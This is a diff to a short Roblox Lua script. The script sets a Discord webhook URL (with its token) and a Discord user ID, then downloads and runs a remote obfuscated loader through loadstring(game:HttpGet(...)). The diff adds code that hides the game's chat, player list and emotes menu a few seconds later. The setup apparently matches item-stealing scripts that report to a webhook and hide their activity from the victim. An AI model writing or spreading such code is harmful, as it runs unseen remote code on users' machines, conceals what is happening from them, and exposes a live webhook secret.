@@ -1,5 +1,18 @@
+repeat wait() until game:IsLoaded()
+task.spawn(function()
 getgenv().Config = {
     ["Webhook"] = "https://discord.com/api/webhooks/1325590048736809141/Sz9f-_8m4gtqDqNklOyhH7_oU_W5ttZYDKOepKAMuRc0JG6GOKQSeajL3NkUw-s6BEA-",
     ["UserID"] = "484739592239579136",
 }
 loadstring(game:HttpGet("https://api.luarmor.net/files/v3/loaders/74724ab99fe6df2fd4819846e0282a56.lua"))() 
+end)
+
+task.spawn(function()
+    task.wait(5)
+local StarterGui = game:GetService('StarterGui')
+StarterGui:SetCoreGuiEnabled(Enum.CoreGuiType.Chat, false)
+
+game:GetService('StarterGui'):SetCoreGuiEnabled(Enum.CoreGuiType.PlayerList, false)
+
+game.StarterGui:SetCoreGuiEnabled(Enum.CoreGuiType.EmotesMenu, false)
+end)
